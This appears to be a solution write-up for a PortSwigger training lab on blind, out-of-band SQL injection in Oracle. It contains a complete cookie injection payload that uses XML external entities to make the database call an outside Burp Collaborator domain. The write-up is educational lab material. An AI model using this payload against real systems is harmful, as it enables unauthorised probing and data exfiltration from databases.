# Lab 15 — Blind SQL injection with out-of-band interaction

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

**Entry point:** `TrackingId` cookie · **DB:** Oracle · **Tool:** Burp Collaborator

## Goal

Confirm out-of-band (OAST) SQL injection: make the database fire a DNS/HTTP
interaction to a Burp Collaborator domain.

## Solution

1. The `TrackingId` cookie is vulnerable but neither responses nor timing
   give feedback (same-session concurrent queries make time tricks useless).
   The database is Oracle — which supports network calls from SQL.

2. Get a Collaborator payload domain from
   **Burp → Collaborator → Copy to clipboard** (e.g. `abc123.oastify.com`).

3. Inject `EXTRACTVALUE` + `xmltype` with an external DTD entity pointing
   at Collaborator — **URL-encode the entire payload**:

```
TrackingId: xyz' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"
encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM
"http://abc123.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

(one line, fully URL-encoded)

4. In Collaborator click **Poll now** — a **DNS interaction** from the
   target appears — lab solved.

## Why this works

- Oracle can parse XML (`xmltype`), and XML DTDs can reference external
  entities — the parser resolves `http://...` → a network call leaves the
  target.
- The SQL error from the malformed XML is irrelevant; the side effect
  (DNS lookup) is the signal.

> OOB is also the *only* channel when responses, errors and timing all
> fail — e.g. asynchronous query processing.
